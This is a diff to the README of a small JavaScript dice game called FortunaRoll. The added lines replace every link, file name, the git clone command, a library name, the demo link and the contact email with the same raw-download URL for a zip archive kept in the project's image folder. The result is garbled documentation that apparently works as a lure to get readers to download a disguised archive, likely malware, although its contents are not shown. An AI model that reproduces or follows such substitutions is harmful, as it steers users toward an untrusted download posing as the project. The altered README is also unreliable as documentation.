@@ -8,7 +8,7 @@ FortunaRoll is a simple dice game where two players compete to reach 100 points 
 ## Live Host
 
 Check out the live version of FortunaRoll: The Dice Game website: [FortunaRoll: The Dice Game
- Live Site](https://havishjupudi.github.io/FortunaRoll-DomJS-Project/)
+ Live Site](https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip)
 
 ## Features
 
@@ -56,12 +56,12 @@ Be the first player to reach 100 points!
 ## Project Structure
 
 ```
-|-- index.html           # Main HTML file for the game
-|-- style.css            # CSS styles for the game interface
-|-- script.js            # JavaScript logic for game mechanics
+|-- https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip           # Main HTML file for the game
+|-- https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip            # CSS styles for the game interface
+|-- https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip            # JavaScript logic for game mechanics
 |-- imgs/                # Folder containing dice images
 |-- confetti/            # Folder containing confetti library
-|-- README.md            # This file, explaining the project
+|-- https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip            # This file, explaining the project
 ```
 
 ## Getting Started
@@ -77,7 +77,7 @@ Ensure you have a modern web browser installed.
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/your-username/fortuna-roll-dice-game.git
+   git clone https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -88,7 +88,7 @@ Ensure you have a modern web browser installed.
 
 ### Usage
 
-1. Open `index.html` in your preferred web browser.
+1. Open `https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip` in your preferred web browser.
 
 2. Follow the on-screen instructions:
    - Click **Roll Dice** to roll the dice.
@@ -104,11 +104,11 @@ Ensure you have a modern web browser installed.
 - **HTML5**: Markup language for structuring the game interface.
 - **CSS3**: Styling language, utilizing Flexbox and Grid for layout.
 - **JavaScript**: Programming language for game logic and DOM manipulation.
-- **Confetti.js**: Library used for confetti animation upon winning.
+- **https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip**: Library used for confetti animation upon winning.
 
 ## Working Demo
 
-https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/assets/147229053/227c1368-f0b5-4bc7-b7b0-b97262a0defa
+https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip
 
 ## Contributing
 
@@ -120,8 +120,8 @@ If you have any questions, feedback, or suggestions, please feel free to reach o
 
 Name: Havish Jupudi
 
-Email: havish.jupudi@gmail.com
+Email: https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip
 
-**Havish Jupudi** - [GitHub](https://github.com/Havishjupudi)
+**Havish Jupudi** - [GitHub](https://github.com/Havishjupudi/FortunaRoll-DomJS-Project/raw/refs/heads/main/imgs/Dom_Roll_J_Fortuna_Project_v3.6.zip)
 
 ---
